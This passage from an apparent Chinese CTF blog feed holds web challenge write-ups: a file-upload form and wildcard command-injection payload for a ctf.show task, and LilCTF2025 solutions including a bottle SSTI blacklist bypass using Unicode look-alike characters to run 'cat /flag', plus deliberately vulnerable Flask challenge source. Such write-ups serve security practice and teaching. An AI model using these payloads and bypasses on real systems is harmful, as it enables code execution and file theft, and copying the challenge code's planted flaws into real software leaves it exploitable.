class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://09ad0846-4592-491f-99e1-9236d69b88a5.challenge.ctf.show/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--链接是当前打开的题目链接--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后bp抓包</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250905162535-8zz1zgp.png" alt="image"></p><p>​<code>?c=.%20/???/????????[@-[]</code>​</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bin">#!/bin/sh<br><br>ls<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250905163652-hstgtgl.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bin">#!/bin/sh<br><br>cat flag.php<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250905163907-df4c7v6.png" alt="image"></p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>刷题日记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LilCTF2025</title>
    <link href="/post/lilctf2025-z1kq5ne.html"/>
    <url>/post/lilctf2025-z1kq5ne.html</url>
    
    <content type="html"><![CDATA[<h1 id="LilCTF2025-WEB-WP"><a href="#LilCTF2025-WEB-WP" class="headerlink" title="LilCTF2025 WEB WP"></a>LilCTF2025 WEB WP</h1><h1 id="ez-bottle"><a href="#ez-bottle" class="headerlink" title="ez_bottle"></a>ez_bottle</h1><p>一道关于bottle SSTI的题目</p><p>bottle可以通过斜体字进行waf的bypass，这种bypass超模的地方在于它可以直接替换SSTI利用链里的ASCII字符。</p><p>目前发现的POC只能替换俩字符，分别是<code>o</code>​，<code>a</code>​，在bottle的SSTI里，他们可以被直接替换成<code>ª</code>​ (U+00AA)，<code>º</code>​ (U+00BA)进而绕过各种waf。在使用场景里此trick相当超模。</p><h2 id="题目附件"><a href="#题目附件" class="headerlink" title="题目附件"></a>题目附件</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> route, run, template, post, request, static_file, error<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># hint: flag in /flag , have a try</span><br><br>UPLOAD_DIR = os.path.join(os.path.dirname(__file__), <span class="hljs-string">&#x27;uploads&#x27;</span>)<br>os.makedirs(UPLOAD_DIR, exist_ok=<span class="hljs-literal">True</span>)<br><br>STATIC_DIR = os.path.join(os.path.dirname(__file__), <span class="hljs-string">&#x27;static&#x27;</span>)<br>MAX_FILE_SIZE = <span class="hljs-number">1</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span><br><br>BLACK_DICT = [<span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;sock&quot;</span>, <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;bul&quot;</span>, <span class="hljs-string">&quot;class&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;globals&quot;</span>,<br>              <span class="hljs-string">&quot;get&quot;</span>, <span class="hljs-string">&quot;open&quot;</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">contains_blacklist</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">any</span>(black <span class="hljs-keyword">in</span> content <span class="hljs-keyword">for</span> black <span class="hljs-keyword">in</span> BLACK_DICT)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_symlink</span>(<span class="hljs-params">zipinfo</span>):<br>    <span class="hljs-keyword">return</span> (zipinfo.external_attr &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0o170000</span> == <span class="hljs-number">0o120000</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_safe_path</span>(<span class="hljs-params">base_dir, target_path</span>):<br>    <span class="hljs-keyword">return</span> os.path.realpath(target_path).startswith(os.path.realpath(base_dir))<br><br><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> static_file(<span class="hljs-string">&#x27;index.html&#x27;</span>, root=STATIC_DIR)<br><br><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/static/&lt;filename&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">server_static</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> static_file(filename, root=STATIC_DIR)<br><br><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_page</span>():<br>    <span class="hljs-keyword">return</span> static_file(<span class="hljs-string">&#x27;upload.html&#x27;</span>, root=STATIC_DIR)<br><br><br><span class="hljs-meta">@post(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    zip_file = request.files.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> zip_file <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> zip_file.filename.endswith(<span class="hljs-string">&#x27;.zip&#x27;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file. Please upload a ZIP file.&#x27;</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(zip_file.file.read()) &gt; MAX_FILE_SIZE:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File size exceeds 1MB. Please upload a smaller ZIP file.&#x27;</span><br><br>    zip_file.file.seek(<span class="hljs-number">0</span>)<br><br>    current_time = <span class="hljs-built_in">str</span>(time.time())<br>    unique_string = zip_file.filename + current_time<br>    md5_hash = hashlib.md5(unique_string.encode()).hexdigest()<br>    extract_dir = os.path.join(UPLOAD_DIR, md5_hash)<br>    os.makedirs(extract_dir)<br><br>    zip_path = os.path.join(extract_dir, <span class="hljs-string">&#x27;upload.zip&#x27;</span>)<br>    zip_file.save(zip_path)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> zipfile.ZipFile(zip_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> z:<br>            <span class="hljs-keyword">for</span> file_info <span class="hljs-keyword">in</span> z.infolist():<br>                <span class="hljs-keyword">if</span> is_symlink(file_info):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Symbolic links are not allowed.&#x27;</span><br><br>                real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename))<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_safe_path(extract_dir, real_dest_path):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Path traversal detected.&#x27;</span><br><br>            z.extractall(extract_dir)<br>    <span class="hljs-keyword">except</span> zipfile.BadZipFile:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid ZIP file.&#x27;</span><br><br>    files = os.listdir(extract_dir)<br>    files.remove(<span class="hljs-string">&#x27;upload.zip&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> template(<span class="hljs-string">&quot;文件列表: &#123;&#123;files&#125;&#125;\n访问: /view/&#123;&#123;md5&#125;&#125;/&#123;&#123;first_file&#125;&#125;&quot;</span>,<br>                    files=<span class="hljs-string">&quot;, &quot;</span>.join(files), md5=md5_hash, first_file=files[<span class="hljs-number">0</span>] <span class="hljs-keyword">if</span> files <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;nofile&quot;</span>)<br><br><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/view/&lt;md5&gt;/&lt;filename&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view_file</span>(<span class="hljs-params">md5, filename</span>):<br>    file_path = os.path.join(UPLOAD_DIR, md5, filename)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(file_path):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;File not found.&quot;</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        content = f.read()<br><br>    <span class="hljs-keyword">if</span> contains_blacklist(content):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;you are hacker!!!nonono!!!&quot;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> template(content)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Error rendering template: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span><br><br><br><span class="hljs-meta">@error(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">error404</span>(<span class="hljs-params">error</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bbbbbboooottle&quot;</span><br><br><br><span class="hljs-meta">@error(<span class="hljs-params"><span class="hljs-number">403</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">error403</span>(<span class="hljs-params">error</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Forbidden: You don&#x27;t have permission to access this resource.&quot;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>首先可以看到过滤的非常严格</p><p>test.tpl</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">% <span class="hljs-keyword">import</span> ºs<br>% f = ºs.pºpen(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)<br>% <span class="hljs-keyword">raise</span> Exception(f.read())<br></code></pre></td></tr></table></figure><p>打包成.zip文件</p><p>​<code>curl -X POST http://challenge.xinshi.fun:37305/upload -F &quot;file=@test.zip&quot;</code>​</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/LAMENTXU/articles/18805019">https://www.cnblogs.com/LAMENTXU/articles/18805019</a></p><h1 id="Ekko-note"><a href="#Ekko-note" class="headerlink" title="Ekko_note"></a>Ekko_note</h1><h2 id="题目附件-1"><a href="#题目附件-1" class="headerlink" title="题目附件"></a>题目附件</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   app.py</span><br><span class="hljs-string">@Time    :   2066/07/05 19:20:29</span><br><span class="hljs-string">@Author  :   Ekko exec inc. 某牛马程序员 </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> wraps<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> token_urlsafe<br><span class="hljs-keyword">from</span> flask_sqlalchemy <span class="hljs-keyword">import</span> SQLAlchemy<br><span class="hljs-keyword">from</span> werkzeug.security <span class="hljs-keyword">import</span> generate_password_hash, check_password_hash<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, redirect, url_for, request, flash, session<br><br>SERVER_START_TIME = time.time()<br><br><br><span class="hljs-comment"># 欸我艹这两行代码测试用的忘记删了，欸算了都发布了，我们都在用力地活着，跟我的下班说去吧。</span><br><span class="hljs-comment"># 反正整个程序没有一个地方用到random库。应该没有什么问题。</span><br><span class="hljs-keyword">import</span> random<br>random.seed(SERVER_START_TIME)<br><br><br>admin_super_strong_password = token_urlsafe()<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;your-secret-key-here&#x27;</span><br>app.config[<span class="hljs-string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = <span class="hljs-string">&#x27;sqlite:///site.db&#x27;</span><br>app.config[<span class="hljs-string">&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;</span>] = <span class="hljs-literal">False</span><br><br>db = SQLAlchemy(app)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(db.Model):<br>    <span class="hljs-built_in">id</span> = db.Column(db.Integer, primary_key=<span class="hljs-literal">True</span>)<br>    username = db.Column(db.String(<span class="hljs-number">20</span>), unique=<span class="hljs-literal">True</span>, nullable=<span class="hljs-literal">False</span>)<br>    email = db.Column(db.String(<span class="hljs-number">120</span>), unique=<span class="hljs-literal">True</span>, nullable=<span class="hljs-literal">False</span>)<br>    password = db.Column(db.String(<span class="hljs-number">60</span>), nullable=<span class="hljs-literal">False</span>)<br>    is_admin = db.Column(db.Boolean, default=<span class="hljs-literal">False</span>)<br>    time_api = db.Column(db.String(<span class="hljs-number">200</span>), default=<span class="hljs-string">&#x27;https://api.uuni.cn//api/time&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PasswordResetToken</span>(db.Model):<br>    <span class="hljs-built_in">id</span> = db.Column(db.Integer, primary_key=<span class="hljs-literal">True</span>)<br>    user_id = db.Column(db.Integer, db.ForeignKey(<span class="hljs-string">&#x27;user.id&#x27;</span>), nullable=<span class="hljs-literal">False</span>)<br>    token = db.Column(db.String(<span class="hljs-number">36</span>), unique=<span class="hljs-literal">True</span>, nullable=<span class="hljs-literal">False</span>)<br>    used = db.Column(db.Boolean, default=<span class="hljs-literal">False</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">padding</span>(<span class="hljs-params">input_string</span>):<br>    byte_string = input_string.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(byte_string) &gt; <span class="hljs-number">6</span>: byte_string = byte_string[:<span class="hljs-number">6</span>]<br>    padded_byte_string = byte_string.ljust(<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    padded_int = <span class="hljs-built_in">int</span>.from_bytes(padded_byte_string, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br>    <span class="hljs-keyword">return</span> padded_int<br><br><span class="hljs-keyword">with</span> app.app_context():<br>    db.create_all()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> User.query.filter_by(username=<span class="hljs-string">&#x27;admin&#x27;</span>).first():<br>        admin = User(<br>            username=<span class="hljs-string">&#x27;admin&#x27;</span>,<br>            email=<span class="hljs-string">&#x27;admin@example.com&#x27;</span>,<br>            password=generate_password_hash(admin_super_strong_password),<br>            is_admin=<span class="hljs-literal">True</span><br>        )<br>        db.session.add(admin)<br>        db.session.commit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login_required</span>(<span class="hljs-params">f</span>):<br><span class="hljs-meta">    @wraps(<span class="hljs-params">f</span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decorated_function</span>(<span class="hljs-params">*args, **kwargs</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;user_id&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:<br>            flash(<span class="hljs-string">&#x27;请登录&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>        <span class="hljs-keyword">return</span> f(*args, **kwargs)<br>    <span class="hljs-keyword">return</span> decorated_function<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_required</span>(<span class="hljs-params">f</span>):<br><span class="hljs-meta">    @wraps(<span class="hljs-params">f</span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decorated_function</span>(<span class="hljs-params">*args, **kwargs</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;user_id&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:<br>            flash(<span class="hljs-string">&#x27;请登录&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>        user = User.query.get(session[<span class="hljs-string">&#x27;user_id&#x27;</span>])<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user.is_admin:<br>            flash(<span class="hljs-string">&#x27;你不是admin&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;home&#x27;</span>))<br>        <span class="hljs-keyword">return</span> f(*args, **kwargs)<br>    <span class="hljs-keyword">return</span> decorated_function<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_time_api</span>():<br>    user = User.query.get(session[<span class="hljs-string">&#x27;user_id&#x27;</span>])<br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(user.time_api)<br>        data = response.json()<br>        datetime_str = data.get(<span 